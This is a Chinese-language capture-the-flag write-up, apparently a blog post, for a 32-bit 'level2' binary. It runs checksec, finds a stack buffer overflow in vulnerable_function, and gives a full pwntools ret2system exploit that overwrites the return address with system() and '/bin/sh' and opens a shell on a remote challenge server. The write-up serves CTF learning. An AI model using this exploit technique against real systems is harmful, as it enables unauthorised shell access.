**注意这个解法，比下面的好，下面的还要报错：**[[level2最佳解法]]

先看文件属性，知道是32位程序  
![先checksec查看文件](https://sphandsomejack.github.io/2020/01/31/level2/z.png)

开启了NX，没法用shellcode，但是没有栈保护，可以直接栈溢出  
用32位IDA打开，先看字符串窗口，看看有没有可以直接利用的字符串  
![在这里插入图片描述](https://sphandsomejack.github.io/2020/01/31/level2/a.png)  
发现有system和/bin/sh可以利用，猜测需要溢出覆盖system函数参数，使其变成system(“/bin/sh”)来获取shell  
再看main函数，没有什么疑点，点进vulnerable_function函数看看  
![在这里插入图片描述](https://sphandsomejack.github.io/2020/01/31/level2/b.png)  
发现buf长度为0x88，但read了0x100，且并没有输入限制，存在溢出漏洞

## [](https://sphandsomejack.github.io/2020/01/31/level2/#%E6%80%9D%E8%B7%AF%EF%BC%9A "思路：")思路：

1. 填充字符使buf溢出
2. 溢出后将read函数的返回地址覆盖为system的地址，进入我们构造的伪栈帧
3. 覆盖system的参数，使其变为”/bin/sh”
4. 拿到shell，然后寻找flag

exp：
```python
from pwn import *  
elf = ELF('./level2')  
sys_addr = elf.symbols['system'] #获取system函数地址  
binsh_addr = elf.search('/bin/sh').next() #获取'/bin/sh'字符串的地址  
  
payload = 'a'*140 + p32(sys_addr) + p32(0x1111) + p32(binsh_addr)  
  
sh = remote('111.198.29.45',57892)  
sh.recvline()  
sh.sendline(payload)  
sh.interactive()
```

payload解释：

1. ‘a’*140：由于buf长0x88(十进制为136)，且32位程序ebp长0x4(十进制为4)，所以总共要填充140个字符
2. p32(sys_addr)：覆盖read的返回地址，使其变成system函数地址
3. p32(0x1111)：用于覆盖system的函数返回地址，由于system(“bin/sh”)执行完后会直接拿到shell，所以随便填一个地址即可
4. p32(binsh_addr)：字符串地址，system的参数

拿到shell以后，只需要ls看看有没有flag文件，如果有，直接cat flag就能拿到flag